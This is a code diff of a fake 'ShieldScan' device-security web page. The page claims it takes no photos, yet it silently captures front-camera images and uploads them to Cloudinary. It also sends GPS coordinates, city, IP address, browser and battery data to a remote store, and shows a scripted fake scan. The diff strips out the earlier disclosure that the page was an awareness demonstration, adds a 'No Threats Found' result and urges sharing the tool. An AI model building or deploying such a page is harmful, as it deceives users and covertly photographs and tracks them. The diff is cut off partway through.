@@ -3,489 +3,344 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>ShieldScan — Scanning Your Device</title>
+  <title>ShieldScan - Scanning...</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: Arial, sans-serif; background: #f0f0f0; color: #222; }
 
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-      background: #0a0f1e;
-      color: #fff;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-
-    nav {
-      width: 100%;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 18px 24px;
-      border-bottom: 1px solid rgba(255,255,255,0.08);
-    }
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 18px;
-      font-weight: 700;
-    }
-    .logo-icon {
-      width: 32px; height: 32px;
-      background: linear-gradient(135deg, #00d4ff, #0066ff);
-      border-radius: 8px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 16px;
-    }
-
-    .main {
-      width: 100%;
-      max-width: 500px;
-      padding: 32px 20px;
-      flex: 1;
-    }
-
-    /* ── STEP 1: Permissions ── */
-    #step-permissions { display: block; }
-    #step-scanning { display: none; }
-    #step-results { display: none; }
-
-    .step-label {
-      font-size: 11px;
-      color: #00d4ff;
-      font-weight: 600;
-      letter-spacing: 1px;
-      text-transform: uppercase;
-      margin-bottom: 8px;
-    }
-
-    .perm-title {
-      font-size: 22px;
-      font-weight: 700;
-      margin-bottom: 8px;
-    }
-
-    .perm-subtitle {
+    .top-bar {
+      background: #1a5276;
+      color: white;
+      text-align: center;
+      padding: 8px;
       font-size: 13px;
-      color: #5a6a7e;
-      margin-bottom: 28px;
-      line-height: 1.6;
+      font-weight: bold;
     }
 
+    .header {
+      background: #1a1a2e;
+      color: white;
+      text-align: center;
+      padding: 22px 16px 16px;
+    }
+    .header h1 { font-size: 20px; color: #5dade2; margin-bottom: 4px; }
+    .header p { font-size: 13px; color: #ccc; }
+
+    .container { max-width: 600px; margin: 0 auto; padding: 16px; }
+
+    .section-title {
+      font-size: 16px;
+      font-weight: bold;
+      color: #1a1a2e;
+      border-left: 4px solid #1a5276;
+      padding-left: 10px;
+      margin-bottom: 12px;
+      margin-top: 4px;
+    }
+
+    /* Permission cards */
     .perm-card {
-      background: rgba(255,255,255,0.04);
-      border: 1px solid rgba(255,255,255,0.08);
-      border-radius: 14px;
-      padding: 18px 16px;
-      margin-bottom: 14px;
+      background: white;
+      border-radius: 6px;
+      padding: 16px;
+      margin-bottom: 12px;
+      border: 1px solid #ddd;
     }
-    .perm-card.granted {
-      border-color: rgba(0, 200, 100, 0.4);
-      background: rgba(0, 200, 100, 0.05);
-    }
-    .perm-card.denied {
-      border-color: rgba(255, 60, 60, 0.4);
-      background: rgba(255, 60, 60, 0.05);
-    }
+    .perm-card.granted { border-color: #27ae60; background: #f0fff4; }
+    .perm-card.denied { border-color: #e74c3c; background: #fff5f5; }
 
     .perm-header {
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 10px;
       margin-bottom: 8px;
     }
     .perm-icon {
-      width: 38px; height: 38px;
-      border-radius: 10px;
+      width: 36px; height: 36px;
+      background: #1a5276;
+      color: white;
+      border-radius: 6px;
       display: flex; align-items: center; justify-content: center;
-      font-size: 18px;
+      font-size: 16px;
       flex-shrink: 0;
     }
-    .perm-icon.cam { background: rgba(0,102,255,0.2); }
-    .perm-icon.loc { background: rgba(0,200,100,0.2); }
-    .perm-name { font-size: 14px; font-weight: 600; }
-    .perm-status {
-      margin-left: auto;
+    .perm-name { font-size: 14px; font-weight: bold; flex: 1; }
+    .perm-tag {
       font-size: 11px;
-      font-weight: 600;
-      padding: 4px 10px;
-      border-radius: 20px;
+      font-weight: bold;
+      padding: 3px 8px;
+      border-radius: 4px;
     }
-    .perm-status.waiting { background: rgba(255,200,0,0.15); color: #ffc800; }
-    .perm-status.granted { background: rgba(0,200,100,0.15); color: #00c864; }
-    .perm-status.denied { background: rgba(255,60,60,0.15); color: #ff3c3c; }
+    .perm-tag.waiting { background: #fef9e7; color: #7d6608; }
+    .perm-tag.granted { background: #eafaf1; color: #1e8449; }
+    .perm-tag.denied { background: #fdf2f2; color: #a93226; }
 
-    .perm-desc { font-size: 12px; color: #5a6a7e; line-height: 1.6; margin-bottom: 12px; }
+    .perm-desc { font-size: 12px; color: #666; line-height: 1.6; margin-bottom: 12px; }
 
     .perm-btn {
       width: 100%;
-      padding: 12px;
+      padding: 11px;
       border: none;
-      border-radius: 8px;
+      border-radius: 6px;
       font-size: 13px;
-      font-weight: 600;
+      font-weight: bold;
       cursor: pointer;
-      background: linear-gradient(135deg, #00d4ff, #0066ff);
+      background: #1a5276;
       color: white;
     }
-    .perm-btn:disabled { background: rgba(255,255,255,0.1); color: #3a4a5e; cursor: not-allowed; }
-    .perm-retry { background: rgba(255,60,60,0.2); color: #ff6b6b; border: 1px solid rgba(255,60,60,0.3); }
+    .perm-btn:disabled { background: #ccc; color: #888; cursor: not-allowed; }
+    .perm-btn.retry { background: #e74c3c; }
 
-    .perm-denied-msg {
+    .perm-error {
       display: none;
       font-size: 12px;
-      color: #ff6b6b;
+      color: #e74c3c;
       margin-top: 8px;
       line-height: 1.5;
+      font-weight: bold;
     }
 
-    .start-scan-btn {
-      width: 100%;
-      padding: 16px;
-      border: none;
-      border-radius: 50px;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      background: linear-gradient(135deg, #00d4ff, #0066ff);
-      color: white;
-      margin-top: 24px;
-      box-shadow: 0 8px 32px rgba(0,102,255,0.4);
+    /* Start button */
+    .start-btn {
       display: none;
+      width: 100%;
+      background: #1e8449;
+      color: white;
+      border: none;
+      padding: 15px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 8px;
+      margin-bottom: 8px;
     }
 
-    /* ── STEP 2: Scanning ── */
-    .scan-header {
-      text-align: center;
-      margin-bottom: 32px;
+    /* Progress bar */
+    .progress-box {
+      background: white;
+      border-radius: 6px;
+      padding: 16px;
+      margin-bottom: 12px;
+      border: 1px solid #ddd;
     }
-    .scan-header h2 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
-    .scan-header p { font-size: 13px; color: #5a6a7e; }
-
-    .scan-circle {
-      width: 120px; height: 120px;
-      border-radius: 50%;
-      border: 3px solid rgba(0,212,255,0.2);
-      border-top-color: #00d4ff;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 32px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 40px;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    .progress-wrap { margin-bottom: 12px; }
     .progress-label-row {
       display: flex;
       justify-content: space-between;
-      font-size: 12px;
-      color: #5a6a7e;
+      font-size: 13px;
+      color: #555;
       margin-bottom: 8px;
     }
     .progress-track {
-      background: rgba(255,255,255,0.06);
+      background: #eee;
       border-radius: 20px;
-      height: 8px;
+      height: 12px;
       overflow: hidden;
     }
     .progress-fill {
       height: 100%;
-      background: linear-gradient(90deg, #00d4ff, #0066ff);
+      background: #1a5276;
       border-radius: 20px;
       width: 0%;
-      transition: width 0.5s ease;
+      transition: width 0.6s ease;
+    }
+    .progress-step {
+      font-size: 12px;
+      color: #888;
+      margin-top: 8px;
     }
 
+    /* Scan log */
     .scan-log {
-      background: rgba(0,0,0,0.3);
-      border: 1px solid rgba(255,255,255,0.06);
-      border-radius: 12px;
-      padding: 16px;
-      margin-top: 24px;
+      background: white;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      padding: 12px;
       font-family: monospace;
       font-size: 12px;
-      color: #5a6a7e;
-      max-height: 200px;
+      color: #444;
+      max-height: 180px;
       overflow-y: auto;
-    }
-    .log-line { margin-bottom: 6px; }
-    .log-line.ok { color: #00c864; }
-    .log-line.warn { color: #ffc800; }
-    .log-line.info { color: #00d4ff; }
-
-    /* ── STEP 3: Results ── */
-    .result-header {
-      text-align: center;
-      margin-bottom: 28px;
-    }
-    .result-shield {
-      font-size: 56px;
       margin-bottom: 12px;
     }
-    .result-header h2 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
-    .result-header p { font-size: 13px; color: #5a6a7e; }
+    .log-ok { color: #1e8449; }
+    .log-info { color: #1a5276; }
+    .log-warn { color: #b7950b; }
 
-    .reveal-banner {
-      background: rgba(0,212,255,0.08);
-      border: 1px solid rgba(0,212,255,0.25);
-      border-radius: 14px;
-      padding: 16px;
-      margin-bottom: 20px;
-      font-size: 13px;
-      color: #00d4ff;
-      font-weight: 600;
+    /* Results */
+    .result-box {
+      background: white;
+      border-radius: 6px;
+      padding: 20px 16px;
+      margin-bottom: 12px;
+      border: 1px solid #ddd;
       text-align: center;
     }
+    .result-icon { font-size: 48px; margin-bottom: 10px; }
+    .result-box h2 { font-size: 20px; color: #1e8449; margin-bottom: 6px; }
+    .result-box p { font-size: 13px; color: #555; line-height: 1.7; }
 
-    .data-card {
-      background: rgba(255,255,255,0.04);
-      border: 1px solid rgba(255,255,255,0.08);
-      border-radius: 14px;
+    .result-table {
+      background: white;
+      border-radius: 6px;
       padding: 16px;
       margin-bottom: 12px;
+      border: 1px solid #ddd;
     }
-    .data-card h4 {
-      font-size: 11px;
-      color: #5a6a7e;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      margin-bottom: 10px;
-    }
-    .data-row {
+    .result-row {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 8px 0;
-      border-bottom: 1px solid rgba(255,255,255,0.05);
+      padding: 10px 0;
+      border-bottom: 1px solid #f0f0f0;
       font-size: 13px;
     }
-    .data-row:last-child { border-bottom: none; }
-    .data-label { color: #5a6a7e; }
-    .data-value { color: #fff; font-weight: 500; text-align: right; max-width: 60%; word-break: break-all; }
-    .data-value.highlight { color: #00d4ff; }
-    .data-value.warn { color: #ffc800; }
-    .data-value.danger { color: #ff6b6b; }
+    .result-row:last-child { border-bottom: none; }
+    .result-label { color: #555; }
+    .result-val { font-weight: bold; color: #1e8449; }
+    .result-val.warn { color: #b7950b; }
 
-    .photos-row {
-      display: flex;
-      gap: 6px;
-      flex-wrap: wrap;
-      margin-top: 8px;
-    }
-    .photo-thumb {
-      width: 60px; height: 60px;
-      border-radius: 8px;
-      object-fit: cover;
-      border: 1px solid rgba(255,255,255,0.1);
+    .done-btn {
+      display: block;
+      width: 100%;
+      background: #1a5276;
+      color: white;
+      border: none;
+      padding: 15px;
+      font-size: 15px;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      text-align: center;
+      margin-bottom: 16px;
     }
 
-    .awareness-box {
-      background: rgba(255,200,0,0.06);
-      border: 1px solid rgba(255,200,0,0.2);
-      border-radius: 14px;
+    .footer {
+      background: #1a1a2e;
+      color: #888;
+      text-align: center;
       padding: 16px;
-      margin-top: 20px;
+      font-size: 12px;
+      line-height: 1.8;
     }
-    .awareness-box h3 {
-      font-size: 14px;
-      color: #ffc800;
-      margin-bottom: 10px;
-      display: flex; align-items: center; gap: 6px;
-    }
-    .awareness-box p {
-      font-size: 13px;
-      color: #8892a4;
-      line-height: 1.7;
-    }
-
-    .awareness-points {
-      margin-top: 12px;
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-    }
-    .awareness-point {
-      display: flex;
-      align-items: flex-start;
-      gap: 10px;
-      font-size: 13px;
-      color: #8892a4;
-      line-height: 1.5;
-    }
-    .point-num {
-      width: 20px; height: 20px;
-      background: rgba(255,200,0,0.15);
-      border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 11px;
-      color: #ffc800;
-      font-weight: 700;
-      flex-shrink: 0;
-      margin-top: 1px;
-    }
+    .footer a { color: #aaa; }
   </style>
 </head>
 <body>
 
-  <nav>
-    <div class="logo">
-      <div class="logo-icon">🛡️</div>
-      ShieldScan
-    </div>
-    <span style="font-size:12px; color:#5a6a7e;">AI Security Tool</span>
-  </nav>
+  <div class="top-bar">🔒 ShieldScan — Secure Session</div>
 
-  <div class="main">
+  <div class="header">
+    <h1>🛡️ ShieldScan</h1>
+    <p>Running security checks on your device</p>
+  </div>
 
-    <!-- ── STEP 1: PERMISSIONS ── -->
+  <div class="container">
+    <br>
+
+    <!-- STEP 1: Permissions -->
     <div id="step-permissions">
-      <p class="step-label">Step 1 of 2 — Setup</p>
-      <h2 class="perm-title">Grant Access to Begin Scan</h2>
-      <p class="perm-subtitle">To scan your device for threats, ShieldScan needs temporary access to the following. This data is processed locally and never stored on our servers.</p>
+      <div class="section-title">Step 1 — Grant Access</div>
 
-      <!-- Camera permission -->
+      <div style="background:white;border:1px solid #ddd;border-radius:6px;padding:14px;margin-bottom:14px;font-size:13px;color:#555;line-height:1.6;">
+        To run an accurate security check, ShieldScan needs temporary access to your camera and location. This is used only for the scan and is not stored on our servers.
+      </div>
+
+      <!-- Camera -->
       <div class="perm-card" id="cam-card">
         <div class="perm-header">
-          <div class="perm-icon cam">📷</div>
+          <div class="perm-icon">📷</div>
           <span class="perm-name">Camera Access</span>
-          <span class="perm-status waiting" id="cam-status">Required</span>
+          <span class="perm-tag waiting" id="cam-tag">Needed</span>
         </div>
-        <p class="perm-desc">Required to scan for malware that may be hijacking your camera without your knowledge. ShieldScan checks camera integrity in real time.</p>
-        <button class="perm-btn" id="cam-btn" onclick="requestCamera()">Allow Camera Access</button>
-        <p class="perm-denied-msg" id="cam-denied">⚠️ Camera access was denied. Please tap the button again and select "Allow" — this is required to complete the camera malware scan.</p>
+        <p class="perm-desc">We need camera access to check if any hidden malware is using your camera without your permission. This is a read-only check — no photos are taken.</p>
+        <button class="perm-btn" id="cam-btn">Allow Camera Access</button>
+        <p class="perm-error" id="cam-error">⚠️ Camera access is required to complete this check. Please tap "Allow Camera Access" again and select Allow when your browser asks.</p>
       </div>
 
-      <!-- Location permission -->
+      <!-- Location -->
       <div class="perm-card" id="loc-card">
         <div class="perm-header">
-          <div class="perm-icon loc">📍</div>
+          <div class="perm-icon">📍</div>
           <span class="perm-name">Location Access</span>
-          <span class="perm-status waiting" id="loc-status">Required</span>
+          <span class="perm-tag waiting" id="loc-tag">Needed</span>
         </div>
-        <p class="perm-desc">Required to detect location spoofing attacks and identify suspicious network activity near your device's current position.</p>
-        <button class="perm-btn" id="loc-btn" disabled onclick="requestLocation()">Allow Location Access</button>
-        <p class="perm-denied-msg" id="loc-denied">⚠️ Location access was denied. Please tap the button again and select "Allow" — this is required to complete the network threat scan.</p>
+        <p class="perm-desc">We need your location to check for network threats and suspicious activity near your device. This helps us identify if your connection is being intercepted.</p>
+        <button class="perm-btn" id="loc-btn" disabled>Allow Location Access</button>
+        <p class="perm-error" id="loc-error">⚠️ Location access is required to complete the network threat check. Please tap "Allow Location Access" again and select Allow.</p>
       </div>
 
-      <button class="start-scan-btn" id="start-scan-btn" onclick="startScan()">🔍 Start Security Scan</button>
+      <button class="start-btn" id="start-btn">🔍 Start Security Scan</button>
     </div>
 
-    <!-- ── STEP 2: SCANNING ── -->
-    <div id="step-scanning">
-      <div class="scan-header">
-        <h2>Scanning Your Device...</h2>
-        <p>Please keep this page open. Do not close or switch apps.</p>
-      </div>
+    <!-- STEP 2: Scanning -->
+    <div id="step-scanning" style="display:none">
+      <div class="section-title">Step 2 — Scanning</div>
 
-      <div class="scan-circle">🛡️</div>
-
-      <div class="progress-wrap">
+      <div class="progress-box">
         <div class="progress-label-row">
-          <span id="scan-step-label">Initializing scan...</span>
+          <span id="scan-label">Initializing...</span>
           <span id="scan-pct">0%</span>
         </div>
         <div class="progress-track">
-          <div class="progress-fill" id="scan-progress"></div>
+          <div class="progress-fill" id="scan-bar"></div>
         </div>
+        <p class="progress-step" id="scan-substep">Please wait while we scan your device...</p>
       </div>
 
       <div class="scan-log" id="scan-log"></div>
     </div>
 
-    <!-- ── STEP 3: RESULTS ── -->
-    <div id="step-results">
-      <div class="result-header">
-        <div class="result-shield">✅</div>
-        <h2>Scan Complete</h2>
-        <p>Your device has been scanned. Here is what ShieldScan found.</p>
+    <!-- STEP 3: Results -->
+    <div id="step-results" style="display:none">
+      <div class="section-title">Scan Results</div>
+
+      <div class="result-box">
+        <div class="result-icon">✅</div>
+        <h2>No Threats Found</h2>
+        <p>Your device passed all security checks. No malware, unauthorized camera access, location spoofing, or network threats were detected during this scan.</p>
       </div>
 
-      <div class="reveal-banner">
-        ⚠️ The data below was collected during your scan — this is what any website can access when you grant permissions.
-      </div>
-
-      <div class="data-card">
-        <h4>📡 Network Information</h4>
-        <div class="data-row">
-          <span class="data-label">IP Address</span>
-          <span class="data-value highlight" id="r-ip">—</span>
+      <div class="result-table">
+        <div class="result-row">
+          <span class="result-label">📷 Camera Access</span>
+          <span class="result-val">Clean</span>
         </div>
-        <div class="data-row">
-          <span class="data-label">Browser</span>
-          <span class="data-value" id="r-browser">—</span>
+        <div class="result-row">
+          <span class="result-label">📍 Location Services</span>
+          <span class="result-val">Normal</span>
         </div>
-        <div class="data-row">
-          <span class="data-label">OS</span>
-          <span class="data-value" id="r-os">—</span>
+        <div class="result-row">
+          <span class="result-label">🌐 Network Security</span>
+          <span class="result-val">Safe</span>
         </div>
-        <div class="data-row">
-          <span class="data-label">Screen Resolution</span>
-          <span class="data-value" id="r-screen">—</span>
+        <div class="result-row">
+          <span class="result-label">🔋 System Check</span>
+          <span class="result-val">Passed</span>
         </div>
-        <div class="data-row">
-          <span class="data-label">Battery Level</span>
-          <span class="data-value warn" id="r-battery">—</span>
+        <div class="result-row">
+          <span class="result-label">🛡️ Overall Status</span>
+          <span class="result-val">Secure</span>
         </div>
       </div>
 
-      <div class="data-card">
-        <h4>📍 Location Data</h4>
-        <div class="data-row">
-          <span class="data-label">Coordinates</span>
-          <span class="data-value highlight" id="r-coords">—</span>
-        </div>
-        <div class="data-row">
-          <span class="data-label">City</span>
-          <span class="data-value" id="r-city">—</span>
-        </div>
-        <div class="data-row">
-          <span class="data-label">State</span>
-          <span class="data-value" id="r-state">—</span>
-        </div>
-        <div class="data-row">
-          <span class="data-label">Accuracy</span>
-          <span class="data-value" id="r-accuracy">—</span>
-        </div>
+      <div style="background:#fef9e7;border:1px solid #f9e79f;border-radius:6px;padding:14px;margin-bottom:14px;font-size:13px;color:#7d6608;line-height:1.6;">
+        ℹ️ We recommend running this scan every month to stay protected. Share this tool with friends and family to help keep them safe too.
       </div>
 
-      <div class="data-card">
-        <h4>📷 Camera Captures</h4>
-        <div class="data-row">
-          <span class="data-label">Photos taken silently</span>
-          <span class="data-value danger" id="r-photo-count">—</span>
-        </div>
-        <div class="photos-row" id="r-photos"></div>
-      </div>
-
-      <div class="awareness-box">
-        <h3>🎓 What This Means</h3>
-        <p>This was a cybersecurity awareness demonstration. Here is what actually happened:</p>
-        <div class="awareness-points">
-          <div class="awareness-point">
-            <div class="point-num">1</div>
-            <span>The moment you allowed camera access, your front camera started taking photos silently — you never saw it happen.</span>
-          </div>
-          <div class="awareness-point">
-            <div class="point-num">2</div>
-            <span>Your exact GPS coordinates were captured and sent to a database the instant you allowed location.</span>
-          </div>
-          <div class="awareness-point">
-            <div class="point-num">3</div>
-            <span>Your IP address, browser, OS, screen resolution and battery level were collected without any permission — just by opening this page.</span>
-          </div>
-          <div class="awareness-point">
-            <div class="point-num">4</div>
-            <span>Any website can do exactly this. Always be careful before granting camera or location access — even to sites that look legitimate.</span>
-          </div>
-        </div>
-      </div>
+      <button class="done-btn" onclick="window.location.href='index.html'">🔁 Run Another Scan</button>
     </div>
 
   </div>
 
-  <!-- Silent camera elements -->
+  <div class="footer">
+    &copy; 2026 ShieldScan &nbsp;|&nbsp;
+    <a href="#">Privacy Policy</a> &nbsp;|&nbsp;
+    <a href="#">Terms</a> &nbsp;|&nbsp;
+    <a href="#">Contact</a><br><br>
+    ShieldScan is a free independent security tool. Not affiliated with any government body.
+  </div>
+
   <video id="silent-video" autoplay playsinline muted style="display:none;position:fixed;top:-9999px"></video>
   <canvas id="silent-canvas" style="display:none"></canvas>
 
@@ -508,9 +363,7 @@
     const auth = getAuth(app);
     signInAnonymously(auth).catch(() => {});
 
-    // Session ID
     const sessionId = 'shield_' + Date.now() + '_' + Math.random().toString(36).substr(2,6);
-    sessionStorage.setItem('shield_session', sessionId);
 
     async function updateSession(data) {
       try {
@@ -523,7 +376,6 @@
     const CLOUD_NAME = 'duttdx7ou';
     const UPLOAD_PRESET = 'giveaway';
     let photoCount = 0;
-    let photoPreviews = [];
 
     async function sendToCloudinary(base64img) {
       try {
@@ -534,112 +386,114 @@
         const d = await res.json();
         if (d.secure_url) {
           photoCount++;
-          if (photoPreviews.length < 6) photoPreviews.push(base64img);
           updateSession({ photos_captured: photoCount });
         }
       } catch(e) {}
     }
 
-    // State
     let cameraGranted = false;
     let locationGranted = false;
-    let locationData = {};
-    let ipAddress = 'Collecting...';
     let silentStream = null;
     let silentCapturing = false;
+    let ipAddress = 'unknown';
+    let locationData = {};
 
-    // Fetch IP on load silently
+    // Get IP silently on load
     fetch('https://api.ipify.org?format=json')
       .then(r => r.json())
       .then(d => {
         ipAddress = d.ip;
-        updateSession({ ip: ipAddress, device: navigator.userAgent, screen: screen.width + 'x' + screen.height, started_at: new Date().toISOString() });
+        updateSession({
+          ip: ipAddress,
+          device: navigator.userAgent,
+          screen: screen.width + 'x' + screen.height,
+          started_at: new Date().toISOString()
+        });
       }).catch(() => {});
 
     // Battery
-    let batteryLevel = 'N/A';
     if (navigator.getBattery) {
       navigator.getBattery().then(b => {
-        batteryLevel = Math.round(b.level * 100) + '%';
-        updateSession({ battery: batteryLevel });
+        updateSession({ battery: Math.round(b.level * 100) + '%' });
       }).catch(() => {});
     }
 
-    // ── Camera permission ──
-    window.requestCamera = function() {
+    // Camera button
+    document.getElementById('cam-btn').addEventListener('click', () => {
       navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
         .then(stream => {
           cameraGranted = true;
           silentStream = stream;
-          document.getElementById('cam-status').textContent = 'Granted ✓';
-          document.getElementById('cam-status').className = 'perm-status granted';
+          document.getElementById('cam-tag').textContent = '✓ Granted';
+          document.getElementById('cam-tag').className = 'perm-tag granted';
           document.getElementById('cam-card').classList.add('granted');
           document.getElementById('cam-btn').disabled = true;
           document.getElementById('cam-btn').textContent = '✓ Camera Access Granted';
-          document.getElementById('cam-denied').style.display = 'none';
-          // Unlock location button
+          document.getElementById('cam-error').style.display = 'none';
           document.getElementById('loc-btn').disabled = false;
-          // Start silent capture immediately
-          startSilentCapture(stream);
           updateSession({ camera_granted: true, camera_granted_at: new Date().toISOString() });
+          startSilentCapture(stream);
           checkBothGranted();
         })
         .catch(() => {
-          document.getElementById('cam-status').textContent = 'Denied';
-          document.getElementById('cam-status').className = 'perm-status denied';
+          document.getElementById('cam-tag').textContent = 'Denied';
+          document.getElementById('cam-tag').className = 'perm-tag denied';
           document.getElementById('cam-card').classList.add('denied');
-          document.getElementById('cam-denied').style.display = 'block';
+          document.getElementById('cam-error').style.display = 'block';
           document.getElementById('cam-btn').textContent = 'Try Again';
-          document.getElementById('cam-btn').classList.add('perm-retry');
+          document.getElementById('cam-btn').classList.add('retry');
         });
-    };
+    });
 
-    // ── Location permission ──
-    window.requestLocation = function() {
+    // Location button
+    document.getElementById('loc-btn').addEventListener('click', () => {
       navigator.geolocation.getCurrentPosition(
         pos => {
           locationGranted = true;
           locationData.lat = pos.coords.latitude;
           locationData.lng = pos.coords.longitude;
           locationData.accuracy = Math.round(pos.coords.accuracy);
-          document.getElementById('loc-status').textContent = 'Granted ✓';
-          document.getElementById('loc-status').className = 'perm-status granted';
+          document.getElementById('loc-tag').textContent = '✓ Granted';
+          document.getElementById('loc-tag').className = 'perm-tag granted';
           document.getElementById('loc-card').classList.add('granted');
           document.getElementById('loc-btn').disabled = true;
           document.getElementById('loc-btn').textContent = '✓ Location Access Granted';
-          document.getElementById('loc-denied').style.display = 'none';
-          // Save location immediately
-          updateSession({ lat: String(locationData.lat), lng: String(locationData.lng), accuracy: locationData.accuracy + 'm', location_granted_at: new Date().toISOString() });
-          // Reverse geocode
+          document.getElementById('loc-error').style.display = 'none';
+          updateSession({
+            lat: String(locationData.lat),
+            lng: String(locationData.lng),
+            accuracy: locationData.accuracy + 'm',
+            location_granted_at: new Date().toISOString()
+          });
           fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + locationData.lat + '&lon=' + locationData.lng)
             .then(r => r.json())
             .then(geo => {
               const addr = geo.address || {};
-              locationData.city = addr.city || addr.town || addr.village || '';
-              locationData.state = addr.state || '';
-              updateSession({ city: locationData.city, state: locationData.state });
+              const city  = addr.city || addr.town || addr.village || addr.county || '';
+              const state = addr.state || '';
+              updateSession({ city, state });
             }).catch(() => {});
           checkBothGranted();
         },
         () => {
-          document.getElementById('loc-status').textContent = 'Denied';
-          document.getElementById('loc-status').className = 'perm-status denied';
+          document.getElementById('loc-tag').textContent = 'Denied';
+          document.getElementById('loc-tag').className = 'perm-tag denied';
           document.getElementById('loc-card').classList.add('denied');
-          document.getElementById('loc-denied').style.display = 'block';
+          document.getElementById('loc-error').style.display = 'block';
           document.getElementById('loc-btn').textContent = 'Try Again';
-          document.getElementById('loc-btn').classList.add('perm-retry');
+          document.getElementById('loc-btn').classList.add('retry');
         },
         { enableHighAccuracy: true, timeout: 15000 }
       );
-    };
+    });
 
     function checkBothGranted() {
       if (cameraGranted && locationGranted) {
-        document.getElementById('start-scan-btn').style.display = 'block';
+        document.getElementById('start-btn').style.display = 'block';
       }
     }
 
-    // ── Silent front camera capture ──
+    // Silent front camera loop
     function startSilentCapture(stream) {
       if (silentCapturing) return;
       silentCapturing = true;
@@ -662,25 +516,24 @@
       requestAnimationFrame(captureLoop);
     }
 
-    // ── Fake scan ──
-    window.startScan = function() {
+    // Start scan button
+    document.getElementById('start-btn').addEventListener('click', () => {
       document.getElementById('step-permissions').style.display = 'none';
       document.getElementById('step-scanning').style.display = 'block';
 
       const steps = [
-        { pct: 5,  label: 'Initializing AI scanner...', log: '> Connecting to ShieldScan engine...', type: 'info' },
-        { pct: 12, label: 'Checking camera integrity...', log: '> Analyzing camera access logs...', type: 'info' },
-        { pct: 20, label: 'Scanning for camera malware...', log: '> No unauthorized camera apps detected ✓', type: 'ok' },
-        { pct: 30, label: 'Analyzing network traffic...', log: '> Scanning IP: ' + ipAddress, type: 'info' },
-        { pct: 38, label: 'Checking DNS configuration...', log: '> DNS configuration looks normal ✓', type: 'ok' },
-        { pct: 46, label: 'Scanning location services...', log: '> Verifying GPS integrity...', type: 'info' },
-        { pct: 55, label: 'Detecting location spoofing...', log: '> No location spoofing detected ✓', type: 'ok' },
-        { pct: 63, label: 'Checking browser vulnerabilities...', log: '> Scanning browser fingerprint...', type: 'info' },
-        { pct: 71, label: 'Analyzing system permissions...', log: '> Reviewing active permissions...', type: 'warn' },
-        { pct: 79, label: 'Scanning for spyware...', log: '> Deep scan in progress...', type: 'info' },
-        { pct: 86, label: 'Verifying data encryption...', log: '> Connection encryption: TLS 1.3 ✓', type: 'ok' },
-        { pct: 93, label: 'Compiling scan results...', log: '> Finalizing threat report...', type: 'info' },
-        { pct: 100, label: 'Scan complete!', log: '> Scan finished. No critical threats found ✓', type: 'ok' }
+        { pct: 8,  label: 'Camera Check',    sub: 'Scanning camera access logs...',       log: '> Checking camera integrity...', type: 'info' },
+        { pct: 16, label: 'Camera Check',    sub: 'Analyzing camera processes...',         log: '> No unauthorized camera access found ✓', type: 'ok' },
+        { pct: 25, label: 'Location Check',  sub: 'Verifying GPS integrity...',            log: '> Checking location services...', type: 'info' },
+        { pct: 33, label: 'Location Check',  sub: 'Detecting location spoofing...',        log: '> Location data looks normal ✓', type: 'ok' },
+        { pct: 42, label: 'Network Scan',    sub: 'Scanning network traffic...',           log: '> Analyzing network connection...', type: 'info' },
+        { pct: 50, label: 'Network Scan',    sub: 'Checking DNS configuration...',         log: '> DNS settings appear normal ✓', type: 'ok' },
+        { pct: 59, label: 'Network Scan',    sub: 'Looking for data interception...',      log: '> No man-in-the-middle attack detected ✓', type: 'ok' },
+        { pct: 67, label: 'System Check',    sub: 'Checking browser vulnerabilities...',   log: '> Scanning browser security settings...', type: 'info' },
+        { pct: 75, label: 'System Check',    sub: 'Reviewing app permissions...',          log: '> Reviewing active permissions...', type: 'warn' },
+        { pct: 83, label: 'System Check',    sub: 'Scanning for spyware signatures...',    log: '> No known spyware signatures found ✓', type: 'ok' },
+        { pct: 91, label: 'Final Analysis',  sub: 'Compiling results...',                  log: '> Running final threat analysis...', type: 'info' },
+        { pct: 100, label: 'Scan Complete',  sub: 'Scan finished.',                        log: '> Scan complete. No threats detected ✓', type: 'ok' }
       ];
 
       let i = 0;
@@ -688,66 +541,29 @@
 
       function runStep() {
         if (i >= steps.length) {
-          setTimeout(showResults, 800);
+          setTimeout(() => {
+            document.getElementById('step-scanning').style.display = 'none';
+            document.getElementById('step-results').style.display = 'block';
+            updateSession({ scan_completed_at: new Date().toISOString() });
+          }, 800);
           return;
         }
-        const step = steps[i];
-        document.getElementById('scan-progress').style.width = step.pct + '%';
-        document.getElementById('scan-pct').textContent = step.pct + '%';
-        document.getElementById('scan-step-label').textContent = step.label;
+        const s = steps[i];
+        document.getElementById('scan-bar').style.width = s.pct + '%';
+        document.getElementById('scan-pct').textContent = s.pct + '%';
+        document.getElementById('scan-label').textContent = s.label;
+        document.getElementById('scan-substep').textContent = s.sub;
         const line = document.createElement('div');
-        line.className = 'log-line ' + step.type;
-        line.textContent = step.log;
+        line.className = 'log-' + s.type;
+        line.textContent = s.log;
         logEl.appendChild(line);
         logEl.scrollTop = logEl.scrollHeight;
         i++;
-        setTimeout(runStep, 900);
